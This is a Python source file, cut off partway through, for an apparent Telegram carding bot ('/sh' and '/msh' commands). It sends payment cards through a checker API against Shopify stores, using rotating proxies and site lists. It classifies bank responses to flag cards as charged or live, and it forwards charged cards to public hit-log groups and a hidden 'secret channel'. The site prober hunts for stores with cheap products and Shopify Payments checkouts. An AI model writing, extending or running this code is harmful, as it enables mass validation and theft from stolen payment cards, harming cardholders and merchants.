"""
sh.py  v28  —  /sh single-card + /msh mass Shopify checker
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Framework : python-telegram-bot v21
API       : https://shopi.up.railway.app/shopii
            GET ?cc=NUM|MM|YY|CVV&site=DOMAIN&proxy=http://ip:port
            site  = plain domain, NO https:// prefix
            proxy = http://ip:port  (WITH http:// prefix)

ROOT-CAUSE FIX:
  The API ALWAYS returns HTTP 200. Errors come in the JSON body:
    {"Response": "site error! status: 404"}
  We check the RESPONSE STRING before classify_response.
  "site error! status: 404/403" → blacklist site, zero-sleep skip.
  Raw API response strings are shown directly to the user.

SITES:
  Sites are loaded exclusively from sites.txt on disk.
  _load_sites() reads sites.txt; stops with a clear error if the file is missing.
  No built-in fallback list  keep sites.txt updated.

DM POLICY:
  CHARGED → user DM + HIT_LOG_GROUP_ID + EXTRA_CHARGED_GROUP_ID
  LIVE    → user DM only
  TDS     → user DM only
  DEAD    → nothing

EXPORTS:
  get_sh_handler, _check_card_with_retry, SITE_RETRIES, SITE_TIMEOUT
  MSH_SESSIONS, run_mass_batch, create_msh_session
  cb_msh_result, cb_msh_stop, build_result_msg
  _load_sites, _load_proxies
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
from __future__ import annotations

import asyncio
import database as db
import json as _json
import logging
import random
import re
import string
import time
from datetime import datetime
from html import escape
from io import BytesIO
from typing import Optional

import aiohttp
from telegram import Update, InputFile, MessageEntity
from telegram.ext import CommandHandler, CallbackQueryHandler, ContextTypes

from config import (
    OWNER_ID,
    get_bin_info, tg_emoji,
    RawMarkup, _btn,
    BOT_NAME, CHANNEL_LINK,
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONSTANTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
API_URL       = "https://shopixx.up.railway.app/"
BOT_CHANNEL   = CHANNEL_LINK
DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'

HIT_LOG_GROUP_ID       = -1004361062205   # public hit log group
EXTRA_CHARGED_GROUP_ID = -1003991915326   # extra charged log

# ── Secret channel — auto-receives every CHARGED card silently ──────────────
SECRET_CHANNEL_ID   = -1003968669478
SECRET_CHANNEL_LINK = "https://t.me/+BfUGjEXaySM2MDc0"
# ── Result card buttons ─────────────────────────────────────────────────────
BOT_USERNAME_LINK   = "https://t.me/Batxchk_bot"
BOT_PLANS_LINK      = "https://t.me/Batxchk_bot?start=plans"  # deep-links → /plans
MY_CHANNEL_LINK     = "https://t.me/Batcardchk"                    # main channel
LOGS_CHANNEL_LINK   = "https://t.me/+XYnHim3rGsw0Yzdk"             # hits log channel

SH_COOLDOWN    = 25

# ── Speed / concurrency settings ───────────────────────────────────────────
# shopi.up.railway.app is a shared Railway app — it can't handle hundreds of
# simultaneous connections.  Too many concurrent calls → 502/503 errors →
# real bank responses (PCI_ERROR, GENERIC_ERROR, etc.) never arrive →
# cards falsely marked DEAD.
#
# Safe values that keep the API healthy:
#   SITE_BATCH=1      → one site attempt at a time per card (no racing)
#   MAX_CONCURRENT=25  → max 8 cards in parallel during /msh
#   API_CONCURRENCY=20→ global hard cap on simultaneous API calls (all users)
SITE_RETRIES       = 20   # max site attempts per card (was 80 — overkill)
SITE_TIMEOUT       = 30   # seconds per API call — generous for slow Railway
MAX_CONCURRENT     = 25    # cards in parallel during /msh  (was 50)
CARD_STAGGER       = 1.5  # seconds between card launches  (was 0.3)
SITE_BATCH         = 1    # sites tried per round (was 3 — caused API floods)
ROUND_DELAY        = 0.5  # seconds to sleep between retry rounds per card
CONSEC_TIMEOUT_MAX = 5    # abort after 5 consecutive timeouts (was 45)
API_CONCURRENCY    = 20   # global semaphore cap — max simultaneous API calls
BUTTON_LOCK    = 30

_CB_RESULT = "mshr"
_CB_STOP   = "mshs"

MSH_SESSIONS: dict  = {}
_BIN_CACHE:   dict  = {}
_DEAD_SITES:  set   = set()
_ALL_PROXIES: list  = []

# ── Disk-IO TTL caches ─────────────────────────────────────────────────────
# _load_proxies() and _load_sites() read files from disk.
# For 1000 concurrent users each calling /sh, re-reading the file every time
# would serialize 1000 blocking disk reads on the event loop.
# These TTL caches ensure disk is only touched once per interval — every
# subsequent call returns the in-memory copy instantly (no I/O, no blocking).
# Global API rate-limiter — created lazily on first use (asyncio.Semaphore
# must be created inside a running event loop, not at import time).
_API_SEM: "asyncio.Semaphore | None" = None

def _get_api_sem() -> "asyncio.Semaphore":
    """Return (creating if needed) the global API concurrency semaphore."""
    global _API_SEM
    if _API_SEM is None:
        _API_SEM = asyncio.Semaphore(API_CONCURRENCY)
    return _API_SEM

_PROXY_CACHE_TS:  float = 0.0
_PROXY_CACHE_TTL: float = 300.0   # refresh proxies from disk every 5 minutes

_SITES_RAW_CACHE: list  = []
_SITES_RAW_TS:    float = 0.0
_SITES_RAW_TTL:   float = 300.0   # refresh sites from disk every 5 minutes

# Site-prober cache — populated by probe_all_sites(), used by get_working_sites()
_WORKING_SITES:     list  = []
_PROBE_IN_PROGRESS: bool  = False
_PROBE_LAST_RUN:    float = 0.0
_PROBE_TASK:        "asyncio.Task | None" = None   # stored so shutdown can cancel it
PROBE_TTL:          float = 1800.0   # re-probe every 30 min
PROBE_CARD:         str   = "4000223372377978|05|29|651"   # same test card as sitechk.py
PROBE_TIMEOUT:      float = 20.0
PROBE_CONCURRENCY:  int   = 60

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# EMOJI IDS  — full set from mst.py (custom premium stickers)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Core card/user/time emojis
CARD_EMOJI_ID     = "5800709991627232190"
USER_EMOJI_ID     = "6267115986541877538"
TIME_EMOJI_ID     = "6285240160120477644"
DEV_EMOJI_ID      = "6267091732861555879"
PRO_EMOJI_ID      = "6280484433027931563"

# Status emojis
DECLINED_EMOJI_ID = "4956612582816351459"

# Hit-log emojis
HIT_GATE_EMOJI_ID = "5341715473882955310"
HIT_RESP_EMOJI_ID = "5839116473951328489"

# Progress-message emojis  (/msh mass checker — unchanged)
PROG_GATE_EMOJI_ID     = "5370935802844946281"
PROG_PROGRESS_EMOJI_ID = "5116268964023894989"
PROG_CHARGED_EMOJI_ID  = "5427168083074628963"
PROG_LIVE_EMOJI_ID     = "6296367896398399651"   # custom live emoji
PROG_DEAD_EMOJI_ID     = "4958526153955476488"
PROG_ERRORS_EMOJI_ID   = "4956611513369494230"

# /sh single-checker spinner — custom premium emoji IDs (user-defined)
SH_GATE_EMOJI_ID = "6220029508456548253"   # ❤️  gate line
SH_PROG_EMOJI_ID = "6298691319086712919"   # 😄  progress line
SH_LIVE_EMOJI_ID = "6296367896398399651"   # 🎸  live count

# Button emojis
BTN_CHARGED_EMOJI_ID  = "5465465194056525619"   # 💎 charged button
BTN_LIVE_EMOJI_ID     = "5039793437776282663"   # ✅ live button
BTN_ALL_EMOJI_ID      = "4956324463525233747"   # 📁 all button
BTN_STOP_EMOJI_ID     = "6179444193518162239"   # ⛔ stop button
CARD_CHK_BTN_EMOJI_ID = "5935795874251674052"   # 💳 hit-log group inline button

# Pool of 18 premium animated emojis — used for CHARGED and LIVE hits (random per card)
CHARGED_EMOJI_IDS = [
    "5801154993188770160", "4956739572114392015", "5285221724634239278",
    "5287777298894835685", "5285024405246725814", "5287547831677112267",
    "5287658362660474522", "5285186510197381130", "5803233241963959320",
    "5462902520215002477", "5787435351521889877", "5323674506705785412",
    "5801005158959683238", "5436143465211640305", "5800688138833629633",
    "5891044423856296980", "5436068999068662274", "5427168083074628963",
]

# LIVE_EMOJI_IDS — separate pool for LIVE hits using the user's custom premium emoji
LIVE_EMOJI_IDS = [
    "6296367896398399651",
]

# Plan emojis (CORE / ELITE / ROOT / CUSTOM)
PLAN_EMOJIS = {
    "CORE":   "5379869575338812919",
    "ELITE":  "5836898273666798437",
    "ROOT":   "4956420911310832630",
    "CUSTOM": "5445027583588593750",
}

# Small-caps → uppercase map for plan name normalisation
SPECIAL_FONT_MAP = {
    'ᴀ': 'A', 'ʙ': 'B', 'ᴄ': 'C', 'ᴅ': 'D', 'ᴇ': 'E',
    'ꜰ': 'F', 'ɢ': 'G', 'ʜ': 'H', 'ɪ': 'I', 'ᴊ': 'J',
    'ᴋ': 'K', 'ʟ': 'L', 'ᴍ': 'M', 'ɴ': 'N', 'ᴏ': 'O',
    'ᴘ': 'P', 'ǫ': 'Q', 'ʀ': 'R', 'ꜱ': 'S', 'ᴛ': 'T',
    'ᴜ': 'U', 'ᴠ': 'V', 'ᴡ': 'W', 'x': 'X', 'ʏ': 'Y',
    'ᴢ': 'Z', 'Ɪ': 'I',
}


def get_random_charged_emoji() -> str:
    """Random premium emoji for CHARGED hits."""
    return random.choice(CHARGED_EMOJI_IDS)


def get_random_live_emoji() -> str:
    """Random premium emoji for LIVE / TDS hits — same pool as mst.py."""
    return random.choice(LIVE_EMOJI_IDS)


def get_plan_emoji_id(plan_name: str) -> str:
    """Return the premium plan emoji ID for a given plan name."""
    if not plan_name:
        return PRO_EMOJI_ID
    norm = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in plan_name)
    if norm in PLAN_EMOJIS:
        return PLAN_EMOJIS[norm]
    for k, v in PLAN_EMOJIS.items():
        if k in norm:
            return v
    return PRO_EMOJI_ID

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESPONSE CLASSIFICATION  — exact match to msh.py logic
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RETRY_ERRORS — site / infrastructure errors
# These mean the Shopify SITE is broken, not that the card failed.
# The retry loop discards this site and tries another.
#
# ⚠  NEVER add single common words like 'failed', 'item', 'resolve' here.
#    Substring matching means 'failed' would eat bank responses that contain
#    "failed" (e.g. "AUTHENTICATION_FAILED") and turn real LIVE cards into
#    endless RETRY loops.  Only add specific, unambiguous strings.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
RETRY_ERRORS = [
    # ── Token / checkout pipeline failures ─────────────────────────────────
    'r4 token empty', 'r2 id empty', 'clinte token',
    'failed to get token', 'token not found', 'failed to get checkout',
    'failed to get session token', 'failed to add to cart',
    'could not extract receiptid', 'receiptid missing',
    'response missing receiptid', 'missing receiptId', 'errmissingreceiptid',
    'could not extract signedhandles', 'extract signedHandles',
    'could not extract private_access_token',
    'could not extract identification signature',
    'could not extract session id', 'could not extract queuetoken',
    'could not extract delivery handle', 'could not extract shipping amount',
    'could not extract total amount', 'could not extract sessiontoken',
    'could not find actions js url',
    'missing stableid', 'missing buildid', 'missing sourcetoken',
    'missing proposal', 'missing submit id',

    # ── Site not usable ─────────────────────────────────────────────────────
    'payment method is not shopify!', 'not shopify!',
    'site not supported for now!', 'site not supported',
    'site requires login!', 'site overloaded', 'site rate limited',
    'application not found', 'store not found', 'app not found',
    'store incompatible', 'errstoreincompatible',

    # ── Product / inventory problems ────────────────────────────────────────
    'product not found', 'product id is empty', 'py id empty',
    'no valid products', 'no available products found',
    'NO_PRODUCTS', 'NO_PRODUCT', 'no_products',
    'MERCHANDISE_OUT_OF_STOCK', 'products.json',
    'INVENTORY_FAILURE', 'inventory_failure',
    'retryable: inventory reservation failure',

    # ── Security / captcha ──────────────────────────────────────────────────
    'hcaptcha detected', 'hcaptcha_detected',

    # ── Delivery / shipping pipeline ────────────────────────────────────────
    'DELIVERY_ZONE_NOT_FOUND', 'delivery_zone_not_found',
    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE',
    'delivery_no_delivery_strategy_available',
    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE',
    'delivery_no_delivery_strategy_available_for_merchandise_line',
    'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED',
    'delivery_delivery_line_detail_changed',
    'DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED',
    'delivery_strategy_conditions_not_satisfied',
    'DELIVERY_OUT_OF_STOCK_AT_ORIGIN_LOCATION',
    'delivery_out_of_stock_at_origin_location',

    # ── Session / validation errors ─────────────────────────────────────────
    'SESSION_ERROR', 'session_error', 'receipt_empty',
    'invalid_response', 'checkout_failed', 'VALIDATION_CUSTOM', 'validation_custom',
    'VAULT_FAILED', 'exceeded 30 poll attempts',

    # ── Tax / amount pipeline ───────────────────────────────────────────────
    'tax ammount empty', 'del ammount empty',

    # ── HTTP-level site errors (from the checker API) ───────────────────────
    'site error! status: 401', 'site error! status: 402',
    'site error! status: 403', 'site error! status: 404',
    'site error! status: 429',
    'site error! status: 500', 'site error! status: 502',
    'site error! status: 503', 'site error! 503',
    'site error',
    'returned status 429', 'returned status 500',
    'returned status 502', 'returned status 503', 'returned status 504',

    # ── Network / proxy errors ──────────────────────────────────────────────
    'connection error', 'connection error!',
    'could not resolve host', 'connect tunnel failed',
    'proxy error', 'curl error', 'http error',
    'timeout',

    # ── Checkout step failures (specific — not just "failed") ───────────────
    'step 0 failed', 'step 1 failed', 'step 2 failed', 'step 3 failed',
    'step 4 failed', 'step 5 failed', 'step 6 failed', 'step 7 failed',
    'step 8 failed', 'step 9 failed', 'step 10 failed',
    'error processing card',

    # ── Gateway / buyer identity issues ─────────────────────────────────────
    'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED',
    'payments_credit_card_brand_not_supported',
    'BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP',
    'buyer_identity_currency_not_supported_by_shop',
    'BUYER_IDENTITY_MARKETING_CONSENT_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN',
    'unable to get payment token',
]

# DECLINED_RESPONSES = confirmed bank hard-declines → card is genuinely bad
# ⚠  Do NOT add CALL_ISSUER here — it means "call your bank", which implies
#    the card exists and is valid.  It is classified as LIVE in classify_response.
DECLINED_RESPONSES = [
    'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_DECLINE',
    'DO NOT HONOR', 'DO_NOT_HONOR', 'UNKNOWN_ERROR', 'Processing Error',
    'PICK_UP_CARD', 'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED',
    'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD', 'TEST_MODE_LIVE_CARD',
    'AMOUNT_TOO_SMALL', 'INCORRECT_NUMBER', 'EXPIRED_CARD',
    'STOLEN_CARD', 'LOST_CARD', 'RESTRICTED_CARD',
    'TRANSACTION_NOT_ALLOWED',
]

# Keep old names as aliases so probe functions still work
DEAD_ERRORS     = RETRY_ERRORS
SUCCESS_RESPONSES = [
    # ── Confirmed LIVE (card hit the bank, soft/ambiguous decline) ──────────
    'INSUFFICIENT_FUNDS', 'INCORRECT_CVV', 'INCORRECT_CVC', 'INCORRECT_ZIP',
    'INVALID_CVC',
    # ── TDS (3-D Secure required) ────────────────────────────────────────────
    '3DS_REQUIRED',
    # ── Charged ──────────────────────────────────────────────────────────────
    'ORDER_PAID',
    # ── Bank hard-declines (card reached bank but was rejected) ──────────────
    'CARD_DECLINED', 'GENERIC_DECLINE', 'DO NOT HONOR', 'DO_NOT_HONOR', 
    'UNKNOWN_ERROR', 'Processing Error', 'PROCESSING_ERROR', 'GENERIC_ERROR',
    'EXPIRED_CARD', 'PICK_UP_CARD', 'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED',
    'AMOUNT_TOO_SMALL', 'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD',
    'TEST_MODE_LIVE_CARD', 'INCORRECT_NUMBER', 'RESTRICTED_CARD',
    'STOLEN_CARD', 'LOST_CARD', 'TRANSACTION_NOT_ALLOWED',
]


def _is_dead_site_response(resp: str) -> bool:
    """True if the response is a site/infrastructure error (should retry another site)."""
    r = resp.lower().strip()
    return any(err.lower() in r for err in RETRY_ERRORS)


def _is_success_response(resp: str) -> bool:
    """True if the response is a real bank response (site is alive)."""
    ru = resp.upper().strip()
    return any(s.upper() in ru for s in SUCCESS_RESPONSES)


def classify_response(resp: str) -> str:
    """
    Classify a response string from shopi.up.railway.app.
    Returns one of: CHARGED | TDS | LIVE | DEAD | RETRY | ERROR

      CHARGED / TDS / LIVE / DEAD  →  final verdict, stop checking this card
      RETRY / ERROR                →  site/infra problem, try a different site

    Note: _parse_response_field() already converts Status=true → "ORDER_PAID"
    before this function is called, so every charged card arrives as ORDER_PAID.

    GENERIC_ERROR classification:
      Shopify returns GENERIC_ERROR when the bank gave an ambiguous response —
      the charge was submitted and the bank replied, but the outcome is unclear.
      This means the card IS valid (it hit a real bank).  → LIVE, not DEAD.
    """
    if not resp:
        return "RETRY"
    mu = resp.upper().strip()
    ml = resp.lower().strip()

    # ── CHARGED ──────────────────────────────────────────────────────────────
    if ("ORDER_PAID"          in mu
            or "PAYMENT_AUTHORIZED" in mu
            or "PAYMENT_ACCEPTED"   in mu
            or "APPROVED"           in mu
            or mu == "CHARGED"):
        return "CHARGED"

    # ── TDS (3-D Secure redirect) — treated as LIVE ─────────────────────────
    if ("3DS_REQUIRED"            in mu
            or "3D_SECURE"            in mu
            or "AUTHENTICATION_REQUIRED" in mu
            or "SCA_REQUIRED"         in mu):
        return "LIVE"

    # ── LIVE (card reached the bank — soft / ambiguous decline) ─────────────
    # Every response here means the card was submitted to the bank and the
    # bank (or Shopify fraud engine) gave a real reply — card is valid/live.
    if ("INSUFFICIENT_FUNDS"       in mu
            or "INCORRECT_CVV"         in mu
            or "INCORRECT_CVC"         in mu
            or "INCORRECT_ZIP"         in mu
            or "INVALID_CVC"           in mu
            or "INVALID_CVV"           in mu
            or "PCI_ERROR"             in mu    # PCI compliance filter — card is LIVE
            or "CVV_FAILED"            in mu
            or "AVS_FAILED"            in mu
            or "RISK_BLOCKED"          in mu
            or "SECURITY_VIOLATION"    in mu
            or "CALL_ISSUER"           in mu
            or "GENERIC_ERROR"         in mu    # ambiguous bank response — card is LIVE
            # ── Shopify-native security / fingerprint strings ────────────────
            or "TRANSFORMER_FINGERPRINT" in mu  # Shopify bot-detection fingerprint
            or "FINGERPRINT"           in mu
            or "PCI"                   in mu    # any PCI-related string
            or ("ARTIFACT" in mu and "SELLER" in mu)  # Shopify checkout artifact
            or "COMPLIANCE"            in mu
            or "CVV2"                  in mu
            or "AVS"                   in mu
            or "RISK"                  in mu
            or "VELOCITY"              in mu    # velocity check = card was processed
            ):
        return "LIVE"

    # ── DEAD (confirmed bank hard-decline — card is bad) ─────────────────────
    if any(d.upper() in mu for d in DECLINED_RESPONSES):
        return "DEAD"

    # ── RETRY (site/infra error — skip to a different Shopify site) ──────────
    # Uses exact substring matching against specific strings only.
    # Never put single common words ('failed', 'item', etc.) in RETRY_ERRORS.
    if any(r.lower() in ml for r in RETRY_ERRORS):
        return "RETRY"

    # ── Unknown response → LIVE ───────────────────────────────────────────────
    # Anything reaching here is NOT a site error and NOT a confirmed hard-decline.
    # The bank/Shopify replied with something unrecognised — card is real → LIVE.
    return "LIVE"




# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOADERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _strip_proxy_scheme(p: str) -> str:
    for pfx in ("socks5://", "socks4://", "https://", "http://"):
        if p.startswith(pfx):
            return p[len(pfx):]
    return p


def _load_proxies() -> list:
    """Load proxies from disk with a 5-minute TTL cache.

    For 1000 concurrent /sh calls this means ONE disk read per 5 minutes
    instead of 1000 blocking disk reads — all subsequent callers get the
    in-memory list instantly with zero I/O.
    """
    global _ALL_PROXIES, _PROXY_CACHE_TS
    import os
    now = time.time()
    # Return cached result if it is still fresh
    if _ALL_PROXIES and (now - _PROXY_CACHE_TS) < _PROXY_CACHE_TTL:
        return list(_ALL_PROXIES)

    for fname in ("px.txt", "proxies.txt"):
        for base in ("", "..", os.path.dirname(os.path.abspath(__file__))):
            path = os.path.join(base, fname) if base else fname
            try:
                with open(path, encoding="utf-8", errors="ignore") as f:
                    raw = [l.strip() for l in f
                           if l.strip() and not l.startswith(("#", "//", ";"))]
                if raw:
                    lines = [_strip_proxy_scheme(p) for p in raw]
                    _ALL_PROXIES    = lines
                    _PROXY_CACHE_TS = time.time()
                    logging.info(f"[SH] {len(lines)} proxies loaded from {path}")
                    return lines
            except (FileNotFoundError, PermissionError):
                pass
    logging.warning("[SH] No proxy file found — add px.txt with ip:port lines")
    _ALL_PROXIES    = []
    _PROXY_CACHE_TS = time.time()   # cache the "empty" result too
    return []


def _strip_scheme(url: str) -> str:
    url = url.strip()
    for pfx in ("https://", "http://", "www."):
        if url.startswith(pfx):
            url = url[len(pfx):]
    return url.rstrip("/")


def _load_sites() -> list:
    """Load sites from sites.txt with a 5-minute TTL cache.

    Returns a FRESH SHUFFLED copy each call so every card gets a different
    site-rotation order — the shuffle is done on the cached list, not on
    disk, so no I/O happens after the first successful read within the TTL.
    For 1000 concurrent /sh calls this means ONE disk read per 5 min.

    Raises RuntimeError if the file is missing or empty so the problem
    is immediately visible instead of silently checking nothing.
    """
    global _SITES_RAW_CACHE, _SITES_RAW_TS
    import os
    now = time.time()
    # Return shuffled copy of cached list if still fresh
    if _SITES_RAW_CACHE and (now - _SITES_RAW_TS) < _SITES_RAW_TTL:
        result = list(_SITES_RAW_CACHE)
        random.shuffle(result)
        return result

    for base in ("", "..", os.path.dirname(os.path.abspath(__file__))):
        path = os.path.join(base, "sites.txt") if base else "sites.txt"
        try:
            with open(path, encoding="utf-8", errors="ignore") as f:
                raw_lines = [_strip_scheme(l) for l in f
                             if l.strip() and not l.startswith("#")]
            raw_lines = [l for l in raw_lines if l]
            if raw_lines:
                _SITES_RAW_CACHE = raw_lines
                _SITES_RAW_TS    = time.time()
                result = list(raw_lines)
                random.shuffle(result)
                logging.info(f"[SH] {len(result)} sites loaded from {path}")
                return result
        except (FileNotFoundError, PermissionError):
            pass
    raise RuntimeError(
        "sites.txt not found or empty — create sites.txt with one Shopify domain per line"
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SITE PROBER  — finds which sites the API actually supports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _probe_one_site(site: str, proxies: list) -> bool:
    """
    Return True if this site is alive and usable for real card checks.
    Uses the same criteria as sitechk.py:
      1. Gateway must be "SHOPIFY PAYMENTS"
      2. Response must be in SUCCESS_RESPONSES (real bank decline)
      3. Price must be $0.50–$6.00  (too low = store blocks test; too high = risky)
      4. ORDER_PAID on probe card = block (don't want accidental charges)
    """
    MAX_PROBE_RETRIES = 3
    for attempt in range(MAX_PROBE_RETRIES):
        px = random.choice(proxies) if proxies else None
        try:
            resp, gw, price, currency, http_st = await _call_api(
                PROBE_CARD, site, px, timeout=PROBE_TIMEOUT
            )
        except Exception:
            await asyncio.sleep(0.3)
            continue

        # HTTP errors → dead
        if http_st and http_st not in (200,):
            return False

        # Gateway MUST be Shopify Payments
        if gw.upper().strip() != "SHOPIFY PAYMENTS":
            return False

        resp_upper = resp.upper().strip()

        # ORDER_PAID on probe card = site actually charged test card → block
        if "ORDER_PAID" in resp_upper or resp_upper == "PAID":
            logging.warning(f"[PROBE] BLOCKED {site}: ORDER_PAID on test card")
            return False

        # Dead-site error → this site is broken, try again with different proxy
        if _is_dead_site_response(resp):
            await asyncio.sleep(0.3)
            continue

        # Real bank response → site is alive!
        # Price constraint: reject only absurd amounts (>$20) to avoid accidental charges
        if _is_success_response(resp):
            try:
                p = float(re.sub(r"[^\d.]", "", str(price)))
                if p > 20.0:
                    logging.debug(f"[PROBE] ❌ {site} price ${p:.2f} too high, blocked")
                    return False
            except Exception:
                pass  # Can't parse price — accept anyway
            logging.info(f"[PROBE] ✅ {site} alive: {resp!r} price={price}")
            return True

        # Unknown response → try another attempt
        await asyncio.sleep(0.2)
        continue

    return False


async def probe_all_sites(all_sites: list, proxies: list,
                          on_progress=None) -> list:
    """
    Test every site concurrently. Returns confirmed-working sites.
    Falls back to all_sites if nothing is alive.
    on_progress(done, total) is called every 50 sites if provided.

    Safe to cancel: all inner tasks are cancelled first so no
    asyncio.Semaphore waiter is left trying to wake up on a closed loop.
    """
    global _WORKING_SITES, _PROBE_IN_PROGRESS, _PROBE_LAST_RUN

    if _PROBE_IN_PROGRESS:
        logging.info("[PROBE] already running — skipping duplicate call")
        return _WORKING_SITES or all_sites

    _PROBE_IN_PROGRESS = True
    logging.info(f"[PROBE] Starting: {len(all_sites)} sites, "
                 f"{len(proxies)} proxies, concurrency={PROBE_CONCURRENCY}")

    sem     = asyncio.Semaphore(PROBE_CONCURRENCY)
    working = []
    done_n  = 0
    total   = len(all_sites)
    tasks: list = []

    async def _check_one(site):
        nonlocal done_n
        try:
            async with sem:
                try:
                    result = await _probe_one_site(site, proxies)
                except asyncio.CancelledError:
                    raise
                except Exception:
                    result = False
                done_n += 1
                if result:
                    working.append(site)
                if on_progress and done_n % 50 == 0:
                    try:
                        await on_progress(done_n, total)
                    except Exception:
                        pass
        except asyncio.CancelledError:
            raise          # let gather handle it
        except RuntimeError:
            pass           # event loop closed mid-release — exit silently

    try:
        tasks = [asyncio.ensure_future(_check_one(s)) for s in all_sites]
        await asyncio.gather(*tasks, return_exceptions=True)
    except asyncio.CancelledError:
        # Cancel every live probe task so their semaphore waiters never run
        # on a loop that's already shutting down.
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
        raise
    finally:
        _PROBE_IN_PROGRESS = False

    if working:
        random.shuffle(working)
        _WORKING_SITES  = working
        _PROBE_LAST_RUN = time.time()
        logging.info(f"[PROBE] ✅ {len(working)}/{total} sites alive")
    else:
        logging.warning("[PROBE] ⚠️ 0 working sites found — "
                        "keeping previous cache or using full list")
        if not _WORKING_SITES:
            _WORKING_SITES = list(all_sites)

    return _WORKING_SITES


def get_working_sites() -> list:
    """Return probed working sites, or the full list if probe hasn't run."""
    return list(_WORKING_SITES) if _WORKING_SITES else _load_sites()


async def _auto_probe_loop(all_sites: list, proxies: list):
    """Background loop: probe now, then re-probe every PROBE_TTL seconds.
    Exits cleanly on CancelledError so the event loop can close without
    leaving semaphore waiters dangling on a dead loop."""
    try:
        await asyncio.sleep(5)      # let bot finish startup first
    except asyncio.CancelledError:
        return
    while True:
        try:
            await probe_all_sites(all_sites, proxies)
        except asyncio.CancelledError:
            logging.info("[PROBE] background probe cancelled — shutting down")
            return
        except Exception as exc:
            logging.error(f"[PROBE] background error: {exc}")
        try:
            await asyncio.sleep(PROBE_TTL)
        except asyncio.CancelledError:
            logging.info("[PROBE] background sleep cancelled — shutting down")
            return


def start_probe_background(all_sites: list, proxies: list) -> None:
    """Schedule the background probe loop. Call once from _post_init.
    Stores the task so stop_probe_background() can cancel it on shutdown."""
    global _PROBE_TASK
    _PROBE_TASK = asyncio.ensure_future(_auto_probe_loop(all_sites, proxies))
    # Log unexpected task failures (CancelledError is expected on shutdown)
    def _on_done(t: asyncio.Task):
        if not t.cancelled():
            exc = t.exception()
            if exc:
                logging.error(f"[PROBE] background task died: {exc}")
    _PROBE_TASK.add_done_callback(_on_done)


async def stop_probe_background() -> None:
    """Cancel the background probe loop and wait for it to finish.
    Call from the PTB post_shutdown hook so all semaphore waiters are
    torn down before the event loop closes."""
    global _PROBE_TASK
    task = _PROBE_TASK
    if task is None or task.done():
        return
    task.cancel()
    try:
        await asyncio.wait_for(asyncio.shield(task), timeout=6.0)
    except (asyncio.CancelledError, asyncio.TimeoutError, Exception):
        pass
    _PROBE_TASK = None
    logging.info("[PROBE] background prober stopped cleanly")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD UTILITIES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def luhn_check(n: str) -> bool:
    n = str(n).strip()
    if not n.isdigit(): return False
    t = 0
    for i, c in enumerate(n[::-1]):
        d = int(c)
        if i % 2 == 1:
            d *= 2
            if d > 9: d -= 9
        t += d
    return t % 10 == 0


def is_expired(mm: str, yy: str) -> bool:
    try:
        now = datetime.now()
        ey, em = int(yy), int(mm)
        if ey < now.year % 100: return True
        if ey == now.year % 100 and em < now.month: return True
        return False
    except ValueError:
        return True


def extract_cards(text: str) -> list:
    patterns = [
        r'(\d{13,19})\s*[|/:=]\s*(\d{1,2})\s*[|/:=]\s*(\d{2,4})\s*[|/:=]\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    seen, results = set(), []
    for pat in patterns:
        for m in re.findall(pat, text):
            cc, mm, yy, cvv = m
            mm = mm.zfill(2)
            if len(yy) == 4: yy = yy[2:]
            s = f"{cc}|{mm}|{yy}|{cvv}"
            if s not in seen:
                seen.add(s); results.append(s)
    return results


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API CALL
# f-string URL keeps | chars unencoded (aiohttp params= encodes them)
